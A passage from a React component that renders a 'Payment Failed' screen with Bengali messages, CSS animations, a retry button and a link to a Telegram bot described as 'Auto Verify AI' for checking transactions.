            @keyframes redFlash{0%,100%{background:transparent}30%{background:rgba(239,68,68,0.15)}}
            @keyframes fadeInUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
            @keyframes borderGlow{0%,100%{box-shadow:0 0 0 rgba(59,130,246,0)}50%{box-shadow:0 0 16px rgba(59,130,246,0.5)}}
            @keyframes dot{0%,80%,100%{opacity:0}40%{opacity:1}}
            .fail-emoji{animation:shakeIn 0.7s cubic-bezier(0.34,1.56,0.64,1) forwards}
            .fail-bg{animation:redFlash 0.8s ease-out}
            .auto-verify{animation:fadeInUp 0.5s ease-out 0.8s both}
            .verify-box{animation:borderGlow 2s ease-in-out infinite}
            .dot1{animation:dot 1.2s infinite 0s}
            .dot2{animation:dot 1.2s infinite 0.2s}
            .dot3{animation:dot 1.2s infinite 0.4s}
          `}</style>
          <div className="fail-bg rounded-2xl p-2">
            <div className="text-5xl fail-emoji">❌</div>
          </div>
          <div>
            <p className="text-xl font-black text-red-400">Payment Failed</p>
            <p className="text-sm font-bold text-white/60 mt-0.5">Please Contact Admin</p>
            <p className="text-xs text-white/35 mt-2 leading-relaxed">আপনার পেমেন্ট রিজেক্ট হয়েছে।<br />সাহায্যের জন্য অ্যাডমিনের সাথে যোগাযোগ করুন।</p>
          </div>
          <button onClick={resetAll} className="w-full py-3 rounded-xl bg-white/5 border border-white/10 text-white/60 font-bold text-sm hover:bg-white/10 active:scale-95 transition-all">Try Again</button>

          <div className="auto-verify verify-box rounded-xl border border-blue-500/30 bg-blue-500/5 p-4 space-y-3">
            <div className="flex items-center gap-2 justify-center">
              <span className="text-lg">🤖</span>
              <p className="text-sm font-bold text-blue-300">Auto Verify AI</p>
              <span className="text-blue-400 text-sm font-mono"><span className="dot1">.</span><span className="dot2">.</span><span className="dot3">.</span></span>
            </div>
            <p className="text-xs text-white/50 leading-relaxed text-center">
              আপনি <span className="text-blue-300 font-bold">Auto Verify AI</span> থেকে আপনার লেনদেন ভেরিফাই করুন।<br />আমাদের বট আপনার পেমেন্ট স্বয়ংক্রিয়ভাবে যাচাই করবে।
            </p>
            <a href="https://t.me/Replittest836383bot" target="_blank" rel="noopener noreferrer"
              className="flex items-center justify-center gap-2 w-full py-2.5 rounded-lg bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-500 hover:to-blue-400 text-white font-bold text-sm active:scale-95 transition-all shadow-[0_0_15px_rgba(59,130,246,0.4)]">
              📨 Verify via Bot
            </a>
          </div>
        </div>
      )}

      <div className="flex items-center gap-3 py-1">
        <div className="flex-1 h-px bg-white/5" />
        <span className="text-xs text-white/20 font-bold uppercase tracking-widest">Premium Content</span>
        <div className="flex-1 h-px bg-white/5" />
      </div>
    </div>
  );
}
